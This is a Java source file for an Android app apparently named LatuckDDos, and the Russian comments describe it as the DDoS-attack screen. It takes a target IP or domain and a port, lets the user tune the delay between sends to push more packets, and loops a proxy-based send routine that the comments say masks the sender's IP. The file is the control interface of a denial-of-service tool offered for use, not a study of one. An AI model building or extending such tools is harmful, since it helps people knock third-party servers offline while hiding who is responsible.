/*________________________________________________*//*


               Author: @Squatedev
               age: 19
               name: null


/*________________________________________________*/

// класс для работы с категорией ддос меню для ддос атаки создатель : SquateDev
// накидал комментариев так как кент попросил чтобы понять код держи друг мой будет как хотела буду стараться все комментировать каждый кусок чтобы ты понял брух мой

package dev.squatedev.latuckddos.Activity;

import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.text.Html;
import android.widget.Button;
import android.widget.EditText;
import android.widget.SeekBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import dev.squatedev.latuckddos.ProxySend.ClientTesterAttack;
import dev.squatedev.latuckddos.R;

public class ActivityTEST extends AppCompatActivity {
    private TextView delayed_text;
    private EditText editText1;
    private EditText editText2;
    private Button button1;
    private SeekBar seek_delayed;
    private TextView textView1;
    private int delayed_send = 100;
    private boolean start_attack = false;
    private ClientTesterAttack clientTesterAttack;
    private String tag = "LatuckDDos";
    private Handler handler;
    private String get_selected_proxy = "n/a";
    private Runnable runnable;
    private Handler hand;

    @Override
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_test);
        // поле ввода ип адресса или домена
        editText1 = findViewById(R.id.editTextIP);
        // поле ввода порт.
        editText2 = findViewById(R.id.editTextPort);
        // кнопка для старта атаки и также остановить атаку
        button1 = findViewById(R.id.buttonStart);
        // задержка между отправкой чем меньше тем быстрее и больше пакетов
        delayed_text = findViewById(R.id.msg_show);
        // слайдер для управления задержками
        seek_delayed = findViewById(R.id.msg_seekbar);
        // статус
        textView1 = findViewById(R.id.statusText);
        //экземпляр класса прокси для отправки атаки и также масскировки ип
        clientTesterAttack = ClientTesterAttack.getInstance(this);
        // выставляем отсупы по размерам чтобы все красиво встало а не вылетело за рамки
        handler = new Handler(Looper.getMainLooper());
        hand = new Handler(Looper.getMainLooper());
        // отсупы в статус бар и навигатор если он есть крч да да
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.linearLayout), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });
        // активируем все обработки по кнопкам, и слайдерам
        load_callback();
    }

    private boolean validate(){
        String ip = editText1.getText().toString().trim();
        String port = editText2.getText().toString().trim();
        if(ip.isEmpty() || port.isEmpty()){
            return true;
        }
        return false;
    }

    // основная функция которая установит все обработки на кнопки, слайдера и т.д
    private void load_callback(){
        // обработка на кнопку старт или стоп атаки кнопка играет сразу две роли остановка и старт
        button1.setOnClickListener(v ->{
            if(validate()){toast("Проверьте поле ввода IP и Port");return;}
            start_attack = !start_attack;
            if(start_attack){
                button1.setText("STOP");
                tick();
            } else {
                button1.setText("START");
                textView1.setText("STATUS: READY");
                hand.removeCallbacks(runnable);
            }
        });
        // обработка слайдера чтобы установить на текст счет задржеки, между отправками
        seek_delayed.setOnSeekBarChangeListener(new SeekBar.OnSeekBarChangeListener() {
            @Override
            public void onProgressChanged(SeekBar seekBar, int i, boolean b) {
                delayed_text.setText(seekBar.getProgress()+": Delayed");
                delayed_send = seekBar.getProgress();
            }

            @Override
            public void onStartTrackingTouch(SeekBar seekBar) {
                delayed_text.setText(seekBar.getProgress()+": Delayed");
                delayed_send = seekBar.getProgress();
            }

            @Override
            public void onStopTrackingTouch(SeekBar seekBar) {
                delayed_text.setText(seekBar.getProgress()+": Delayed");
                delayed_send = seekBar.getProgress();
            }
        });
    }

    private void tick(){
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if(start_attack){
                    clientTesterAttack.send(editText1.getText().toString().trim(), editText2.getText().toString().trim(), "",  false, false);
                }
                handler.postDelayed(this, delayed_send);
            }
        }, delayed_send);
        runnable = new Runnable() {
            @Override
            public void run() {
                textView1.setText(Html.fromHtml(clientTesterAttack.getStatus()));
                hand.postDelayed(this, 300);
            }
        };
        hand.postDelayed(runnable, 300);
    }

    // Toast
    private void toast(String msg){
        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        start_attack = false;
        if(handler != null){
            handler.removeCallbacksAndMessages(null);
        }
    }
}